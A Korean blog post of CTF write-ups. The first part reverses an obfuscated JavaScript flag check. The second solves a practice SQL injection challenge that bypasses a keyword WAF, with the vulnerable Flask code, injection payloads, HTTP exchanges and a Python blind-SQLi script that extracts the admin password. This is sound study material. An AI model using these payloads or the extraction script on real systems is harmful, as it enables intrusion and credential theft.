---
title: "[WEB] 공부한 지 4일차"
date: 2026-03-16 14:00:00
categories: Essay
tags: [study]
---

**UTCTF**에서 0솔브의 사나이 덕분에 정말 즐거운 시간을 보냈다.  
팀 단위로 CTF를 제대로 뛴 적도 없었고, 전략을 따로 세워본 적도 없었다.  
플래그는 세웠다. 근데 왜안됨?????  

암튼, 끝나고 다시 공부로 복귀함.  
밀린 게 있어서 오늘 웹 + 리버싱 같이 해야할듯.  

# funjs

> **Description**  
> 입력 폼에 데이터를 입력하여 맞으면 플래그, 틀리면 NOP !을 출력하는 HTML 페이지입니다.  
> main 함수를 분석하여 올바른 입력 값을 찾아보세요 !

문제파일에는 오직 `html`파일 하나만 들어있다.  
아, 이거 역산이구나... 싶었다.  

천재적인 사내, 그것이 나다.     
<!--more-->
```html
<html>
    ...
    <script>
    ...

    function text2img(text){
        var imglist = box.getElementsByTagName('img');
        while(imglist.length > 0) {imglist[0].remove();}
        var canvas = document.createElement("canvas");
        canvas.width = 620;
        canvas.height = 80;
        var ctx = canvas.getContext('2d');
        ctx.font = "30px Arial";
        var text = text;
        ctx.fillText(text,10,50);
        var img = document.createElement("img");
        img.src = canvas.toDataURL();
        box.append(img);
    };

    function main(){
        var _0x1046=['2XStRDS','1388249ruyIdZ','length','23461saqTxt','9966Ahatiq','1824773xMtSgK','1918853csBQfH','175TzWLTY','flag','getElementById','94hQzdTH','NOP\x20!','11sVVyAj','37594TRDRWW','charCodeAt','296569AQCpHt','fromCharCode','1aqTvAU'];
        var _0x376c = function(_0xed94a5, _0xba8f0f) {
            _0xed94a5 = _0xed94a5 - 0x175;
            var _0x1046bc = _0x1046[_0xed94a5];
            return _0x1046bc;
        };
        var _0x374fd6 = _0x376c;
        (function(_0x24638d, _0x413a92) {
            var _0x138062 = _0x376c;
            while (!![]) {
                try {
                    var _0x41a76b = -parseInt(_0x138062(0x17f)) + parseInt(_0x138062(0x180)) * -parseInt(_0x138062(0x179)) + -parseInt(_0x138062(0x181)) * -parseInt(_0x138062(0x17e)) + -parseInt(_0x138062(0x17b)) + -parseInt(_0x138062(0x177)) * -parseInt(_0x138062(0x17a)) + -parseInt(_0x138062(0x17d)) * -parseInt(_0x138062(0x186)) + -parseInt(_0x138062(0x175)) * -parseInt(_0x138062(0x184));
                    if (_0x41a76b === _0x413a92) break;
                    else _0x24638d['push'](_0x24638d['shift']());
                } catch (_0x114389) {
                    _0x24638d['push'](_0x24638d['shift']());
                }
            }
        }(_0x1046, 0xf3764));
        var flag = document[_0x374fd6(0x183)](_0x374fd6(0x182))['value'],
            _0x4949 = [0x20, 0x5e, 0x7b, 0xd2, 0x59, 0xb1, 0x34, 0x72, 0x1b, 0x69, 0x61, 0x3c, 0x11, 0x35, 0x65, 0x80, 0x9, 0x9d, 0x9, 0x3d, 0x22, 0x7b, 0x1, 0x9d, 0x59, 0xaa, 0x2, 0x6a, 0x53, 0xa7, 0xb, 0xcd, 0x25, 0xdf, 0x1, 0x9c],
            _0x42931 = [0x24, 0x16, 0x1, 0xb1, 0xd, 0x4d, 0x1, 0x13, 0x1c, 0x32, 0x1, 0xc, 0x20, 0x2, 0x1, 0xe1, 0x2d, 0x6c, 0x6, 0x59, 0x11, 0x17, 0x35, 0xfe, 0xa, 0x7a, 0x32, 0xe, 0x13, 0x6f, 0x5, 0xae, 0xc, 0x7a, 0x61, 0xe1],
            operator = [(_0x3a6862, _0x4b2b8f) => {
                return _0x3a6862 + _0x4b2b8f;
            }, (_0xa50264, _0x1fa25c) => {
                return _0xa50264 - _0x1fa25c;
            }, (_0x3d7732, _0x48e1e0) => {
                return _0x3d7732 * _0x48e1e0;
            }, (_0x32aa3b, _0x53e3ec) => {
                return _0x32aa3b ^ _0x53e3ec;
            }],
            getchar = String[_0x374fd6(0x178)];
        if (flag[_0x374fd6(0x17c)] != 0x24) {
            text2img(_0x374fd6(0x185));
            return;
        }
        for (var i = 0x0; i < flag[_0x374fd6(0x17c)]; i++) {
            if (flag[_0x374fd6(0x176)](i) == operator[i % operator[_0x374fd6(0x17c)]](_0x4949[i], _0x42931[i])) {} else {
                text2img(_0x374fd6(0x185));
                return;
            }
        }
        text2img(flag);
    }
    </script>
    ...
</html>
```

볼 필요가 딱히 없는 부분은 생략했다. 문제 파일을 직접 보는 것을 권장한다,   
길어야 읽는데 1분이니까..  

연산에 사용되는 배열은 아래와 같다:  
```bash
_0x4949 = [0x20, 0x5e, 0x7b, 0xd2, 0x59, 0xb1, 0x34, 0x72, 0x1b, 0x69, 0x61,   
0x3c, 0x11, 0x35, 0x65, 0x80, 0x9, 0x9d, 0x9, 0x3d, 0x22, 0x7b, 0x1, 0x9d,   
0x59, 0xaa, 0x2, 0x6a, 0x53, 0xa7, 0xb, 0xcd, 0x25, 0xdf, 0x1, 0x9c]

_0x42931 = [0x24, 0x16, 0x1, 0xb1, 0xd, 0x4d, 0x1, 0x13, 0x1c, 0x32, 0x1, 0xc,  
0x20, 0x2, 0x1, 0xe1, 0x2d, 0x6c, 0x6, 0x59, 0x11, 0x17, 0x35, 0xfe, 0xa, 0x7a,  
0x32, 0xe, 0x13, 0x6f, 0x5, 0xae, 0xc, 0x7a, 0x61, 0xe1]
```


적용되는 연산은 다음과 같다:  
```js
flag.charCodeAt(i) == operator[i % 4](_0x4949[i], _0x42931[i])
```

```js
0: a + b
1: a - b
2: a * b
3: a ^ b
```

연산 배열에 따라 일어나는 실제 연산식은 위와 같다.  

따라서, 연산을 해주는 코드를 작성하면 된다.  
수동으로 연산할 경우,  

```bash
i=0
0x20 + 0x24 = 0x44 = 'D'

i=1
0x5e - 0x16 = 0x48 = 'H'

i=2
0x7b * 0x1 = 0x7b = '{'

i=3
0xd2 ^ 0xb1 = 0x63 = 'c'

i=4
0x59 + 0x0d = 0x66 = 'f'
..
```

대략적으로 연산시 어느정도 맞다는 감을 받을 수 있다.  
이제 코드를 작성하면 된다, 그냥 이게 습관이라..  

---
다음으로 풀어볼 문제는  
`sql injection bypass WAF Advanced` 다.

# SQLi bypass WAF Advanced

> **Description**  
> Exercise: SQL Injection Bypass WAF의 패치된 문제입니다.

```py
...

template ='''
<pre style="font-size:200%">SELECT * FROM user WHERE uid='{uid}';</pre><hr/>
<pre>{result}</pre><hr/>
<form>
    <input tyupe='text' name='uid' placeholder='uid'>
    <input type='submit' value='submit'>
</form>
'''

keywords = ['union', 'select', 'from', 'and', 'or', 'admin', ' ', '*', '/', 
            '\n', '\r', '\t', '\x0b', '\x0c', '-', '+']
def check_WAF(data):
    for keyword in keywords:
        if keyword in data.lower():
            return True

    return False


@app.route('/', methods=['POST', 'GET'])
def index():
    uid = request.args.get('uid')
    if uid:
        if check_WAF(uid):
            return 'your request has been blocked by WAF.'
        cur = mysql.connection.cursor()
        cur.execute(f"SELECT * FROM user WHERE uid='{uid}';")
        result = cur.fetchone()
        if result:
            return template.format(uid=uid, result=result[1])
        else:
            return template.format(uid=uid, result='')

    else:
        return template
...
```

중요한 부분만 남겼다.  
sqli가 가능한 쿼리 구조이다.  
그런데 `python` 코드 부분에서 검증이 이루어진다.  

즉 저 배열 내에 있는 키워드는 사용이 어렵다고 판단했다.  
지우는 것도 아니고 있기만 해도 확정이니..  

글자 길이: 43,  
`||` 가 차단된 목록에 포함되지 않는다.  
따라서 아래의 쿼리로 길이를 확인할 수 있었다.  

`'||(uid=0x61646d696e)%26%26(length(upw)>43)%23`

`44` 이전까지는 되었기에 43글자임을 알 수 있음 ㅇㅇ.
```html
HTTP/1.1 200 OK
Server: Werkzeug/2.3.6 Python/3.10.12
Date: Mon, 16 Mar 2026 03:25:31 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 245
Connection: close


<pre style="font-size:200%">SELECT * FROM user WHERE uid=''||(uid=0x61646d696e)&&(length(upw)>43)#';</pre><hr/>
<pre>admin</pre><hr/>
<form>
    <input tyupe='text' name='uid' placeholder='uid'>
    <input type='submit' value='submit'>
</form>
```

드림핵 플래그가 주로 소문자+숫자.. 라는 점을 감안하면 꽤 걸릴 것 같다.  

불안하기 때문에 아래처럼 먼저 보내봤다.  
결과는 다행히 잘 나왔다.  

이제 익스코드를 짜보겠다.
```html
GET /?uid='||(uid=0x61646d696e)%26%26(substr(upw,1,1)=0x44)%23 HTTP/1.1
Host: host8.dreamhack.games:12857
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://host8.dreamhack.games:12857/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
```

```html
HTTP/1.1 200 OK
Server: Werkzeug/2.3.6 Python/3.10.12
Date: Mon, 16 Mar 2026 03:27:57 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 251
Connection: close

<pre style="font-size:200%">SELECT * FROM user WHERE uid=''||(uid=0x61646d696e)&&(substr(upw,1,1)=0x44)#';</pre><hr/>
<pre>admin</pre><hr/>
<form>
    <input tyupe='text' name='uid' placeholder='uid'>
    <input type='submit' value='submit'>
</form>
```


16진수로도 비교
```py
import requests
import string

url = "http://host8.dreamhack.games:12857/"
password = ""
charset = string.ascii_letters + string.digits + "{}!@#$%^&*()_-+=<>?/"

for i in range(1, 44):  # 43글자
    found = False
    for c in charset:
        hex_char = '0x' + c.encode().hex()
        payload = f"'||(uid=0x61646d696e)%26%26(substr(upw,{i},1)={hex_char})%23"
        full_url = f"{url}?uid={payload}"
        
        r = requests.get(full_url)
        
        if '<pre>admin</pre>' in r.text:
            password += c
            print(f"[+] ({i}/43) Found: {password}")
            found = True
            break

print(f"\n[+] Flag: {password}")
```

--- 

참고자료:  
->> [티스토리 블로그](https://gongv-log.tistory.com/91) <<-

아, 그리고 블로그가 망가져서 조만간 새로 고칠 예정이다.  
당연히 이 디자인 전체를 버리는 건 아니고, 문제가 되는 부분만 바꾸려고 한다.